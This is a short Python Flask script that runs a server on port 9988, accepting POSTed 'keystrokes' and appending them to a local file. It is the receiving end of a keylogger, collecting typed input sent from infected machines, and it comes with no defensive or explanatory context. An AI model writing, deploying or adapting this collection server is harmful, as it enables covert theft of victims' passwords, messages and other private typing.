from flask import Flask, request

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def receive_keys():
    keystrokes = request.form.get('keystrokes')
    with open("received_keystrokes.txt", "a") as f:
        f.write(keystrokes + "\n")
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9988)
